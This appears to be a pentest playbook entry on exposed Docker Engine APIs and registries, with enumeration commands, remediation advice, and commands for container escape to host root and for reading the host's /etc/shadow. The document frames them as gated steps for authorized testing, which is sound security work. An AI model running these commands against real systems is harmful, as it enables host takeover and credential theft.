---
id: docker
technology: "Docker Engine / Registry"
domain: IT
safety_class: safe
severity: critical
life_safety: false
match:
  ports: [2375, 2376]
  banners: ["docker", "containerd", "moby", "docker-distribution"]
  markers: ["/v2/_catalog", "/_ping", "application/vnd.docker.distribution.manifest", "docker-content-digest", "/v2/<name>/tags/list"]
quick_wins:
  - { cmd: "curl -s http://{host}:2375/version", safety: safe, note: "Confirm unauthenticated Docker Engine API access and retrieve daemon version info" }
  - { cmd: "curl -s http://{host}:2375/info | python3 -m json.tool", safety: safe, note: "Enumerate daemon config: swarm status, cgroup driver, runtime, storage driver" }
  - { cmd: "curl -s http://{host}:2375/containers/json | python3 -m json.tool", safety: safe, note: "List running containers with image names, ports, and mounts" }
  - { cmd: "curl -s http://{host}:2375/images/json | python3 -m json.tool", safety: safe, note: "List all local images including internal/private ones" }
  - { cmd: "curl -s http://{host}:5000/v2/_catalog", safety: safe, note: "Enumerate all repositories in an unauthenticated Docker Registry v2 (port 5000 confirmed via /_ping or docker-distribution banner)" }
  - { cmd: "curl -s http://{host}:5000/v2/{repo}/tags/list", safety: safe, note: "List all tags for a given repository in the registry (use only after Docker Registry confirmed via /_ping)" }
  - { cmd: "nmap -sV -p 2375,2376,5000 --script docker-version {host}", safety: safe, note: "Banner grab and version detection via nmap NSE" }
  - { cmd: "docker -H tcp://{host}:2375 ps -a", safety: intrusive, note: "Use Docker CLI to enumerate all containers including stopped ones" }
  - { cmd: "docker -H tcp://{host}:2375 run --rm -it --privileged --net=host --pid=host -v /:/mnt alpine chroot /mnt sh", safety: disruptive, note: "Container escape via privileged container with host root filesystem mount — achieves host root; gated disruptive action" }
  - { cmd: "docker -H tcp://{host}:2375 run --rm -v /etc:/mnt/etc alpine cat /mnt/etc/shadow", safety: disruptive, note: "Exfiltrate host /etc/shadow by mounting host filesystem into a new container — gated disruptive action" }
references: ["CVE-2019-5736", "CVE-2020-15257", "CVE-2021-21284", "CVE-2022-0492", "CISA KEV CVE-2019-5736"]
mitre: "T1610"
---
# Docker Engine / Registry guidance

Docker Engine exposes a REST API (default port 2375 for plaintext, 2376 for TLS) that provides
full programmatic control over containers, images, volumes, and networks. When this API is bound
to a network interface without authentication — a common misconfiguration in development and
internal environments — any host that can reach port 2375 effectively has root on the Docker host.
Docker Registry v2 (commonly on port 5000) provides image storage and distribution; without
authentication, the `/v2/_catalog` endpoint discloses all stored image names and tags, which
frequently include internal application images with embedded secrets, credentials, or proprietary
code.

During an authorized pentest, begin with read-only enumeration: confirm unauthenticated API
access via `/version` and `/info`, then enumerate containers (`/containers/json`), images
(`/images/json`), and registry contents (`/v2/_catalog`). These steps are fully safe and produce
high-value intelligence about the target environment — running workloads, internal hostnames,
network topology, and any secrets visible in image metadata or environment variables. Pull image
manifests and inspect layer history for hard-coded credentials before escalating to active
exploitation.

Container escape via the unauthenticated Engine API is the primary critical path: spawning a
privileged container with the host root filesystem mounted (`-v /:/mnt --privileged`) gives
immediate host root access, enabling persistence, lateral movement, and full node compromise.
This is classified disruptive because it creates new containers on the target host and may
trigger alerting or affect workload scheduling — gate this step on explicit engagement
authorization. Additional escape vectors include CVE-2019-5736 (runc overwrite), CVE-2022-0492
(cgroup v1 release_agent), and CVE-2020-15257 (Containerd abstract socket exposure).

Remediation: bind the Docker API socket to a Unix socket only (`/var/run/docker.sock`) or, if
remote access is required, enforce mutual TLS (`--tlsverify`) and restrict with network ACLs.
Require authentication on Registry v2 via an auth proxy (e.g. htpasswd, token server). Audit
for exposed sockets in Kubernetes environments where `hostPath: /var/run/docker.sock` mounts
grant equivalent daemon control to any pod.
